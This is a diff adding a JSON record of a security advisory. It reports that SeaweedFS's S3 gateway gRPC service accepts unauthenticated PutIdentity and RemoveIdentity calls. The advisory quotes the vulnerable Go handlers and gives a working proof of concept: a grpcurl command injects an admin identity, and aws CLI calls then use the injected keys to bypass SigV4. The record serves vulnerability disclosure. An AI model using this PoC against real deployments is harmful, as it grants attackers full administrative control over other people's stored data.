@@ -1,0 +1,44 @@
+{
+  "global": null,
+  "id": "GHSA-5fx4-c9qp-36jc",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "### Summary\r\n\r\nThe S3 gateway's gRPC service exposes `PutIdentity` and `RemoveIdentity` for managing IAM identities. Neither handler calls any authentication or authorization function before writing to the IAM store, so any network peer that can reach the gRPC port can create an identity with `Admin` actions and an attacker-chosen access key and secret key. That identity is then accepted by the S3 gateway's SigV4 layer as a fully privileged user, completely bypassing SigV4/IAM.\r\n\r\n### Deployment and configuration\r\n\r\n- **Components running:** master, volume server, and filer with `-s3` enabled\r\n- **Attacker-reachable port:** the S3 gRPC port\r\n- **Authentication:** none by default\r\n- **Attacker's starting position:** unauthenticated network attacker with no S3 credential and no certificate\r\n- **Trust boundary crossed:** privilege escalation from an unauthenticated network peer to full administrative capability over the entire S3 credential store.\r\n\r\n### Details\r\n\r\n**File:** `weed/s3api/s3api_server_grpc.go`\r\n**Lines 16-37**\r\n\r\n```go\r\nfunc (s3a *S3ApiServer) PutIdentity(ctx context.Context, req *s3_pb.PutIdentityRequest) (*s3_pb.PutIdentityResponse, error) {\r\n    return s3a.iam.PutIdentity(ctx, req)\r\n}\r\n\r\nfunc (s3a *S3ApiServer) RemoveIdentity(ctx context.Context, req *s3_pb.RemoveIdentityRequest) (*s3_pb.RemoveIdentityResponse, error) {\r\n    return s3a.iam.RemoveIdentity(ctx, req)\r\n}\r\n```\r\n\r\nNeither handler checks a caller identity, a JWT, or a client certificate before calling into the IAM store. Every other S3 data-plane operation on this same server passes through SigV4 signature verification first; these two RPCs skip that layer entirely and let a caller write directly into the credential store that SigV4 later trusts. The generated stub carries a doc comment stating the service is \"designed for unidirectional propagation from Filer to S3 Servers,\" but that intent is not enforced anywhere: there is no auth check, no mTLS requirement, and no IP restriction on the listener.\r\n\r\n### PoC\r\n\r\n**Baseline: SigV4/IAM is actively enforced**\r\n\r\n```bash\r\nAWS_ACCESS_KEY_ID=readonlykey AWS_SECRET_ACCESS_KEY=readonlysecret \\\r\n  aws --endpoint-url http://example:8333 s3 mb s3://should-fail\r\n# An error occurred (AccessDenied) when calling the CreateBucket operation\r\n```\r\n\r\n**Attack: inject an admin IAM identity via the unauthenticated gRPC port**\r\n\r\n```bash\r\ngrpcurl -plaintext -d '{\"user_identity\": {\"name\": \"injected\", \"credentials\": [{\"access_key\": \"AKIAINJECTED\", \"secret_key\": \"injectedsecret\"}], \"actions\": [\"Admin\"]}}' \\\r\n  example:18333 seaweedfs.SeaweedS3.PutIdentity\r\n# {}\r\n```\r\n\r\n**Escalation: authenticate as full admin using the injected credentials**\r\n\r\n```bash\r\nAWS_ACCESS_KEY_ID=AKIAINJECTED AWS_SECRET_ACCESS_KEY=injectedsecret \\\r\n  aws --endpoint-url http://example:8333 s3 mb s3://attacker-bucket\r\n# make_bucket: attacker-bucket\r\n```\r\n\r\nExpected: the second and third calls fail, since the attacker never authenticated to the gRPC service and never held a valid S3 credential.\r\nActual: `PutIdentity` succeeds with no authentication, and the credential it creates is immediately accepted by SigV4, giving the caller full administrative access to every bucket on the deployment.\r\n\r\n### Impact\r\n\r\nAny deployment running `weed s3` or a filer with `-s3` enabled, without a manually configured `[grpc.s3]` TLS section, is vulnerable. This is the default configuration.\r\n\r\nAn unauthenticated attacker who can reach the S3 gRPC port can do the following:\r\n\r\n- Create an arbitrary IAM identity with `Admin` actions and an attacker-chosen access key and secret key\r\n- Use that identity to authenticate as a full admin through the normal SigV4 S3 API, reading, writing, and deleting any bucket or object\r\n- Remove existing IAM identities, denying legitimate users access to their own data\r\n- Repeat the attack at will, since the gRPC port remains permanently unauthenticated\r\n\r\nNo authentication or special privileges are required beyond network reachability to the S3 gRPC port.",
+    "ghsa_id": "GHSA-5fx4-c9qp-36jc",
+    "html_url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-5fx4-c9qp-36jc",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-5fx4-c9qp-36jc"
+      }
+    ],
+    "published_at": "2026-09-18T20:00:43Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "S3 gateway gRPC PutIdentity and RemoveIdentity accept unauthenticated requests, allowing any network peer to inject admin IAM identities and bypass SigV4 authentication",
+    "updated_at": "2026-09-18T20:00:43Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/seaweedfs/seaweedfs"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<=4.45"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "seaweedfs/seaweedfs"
+}
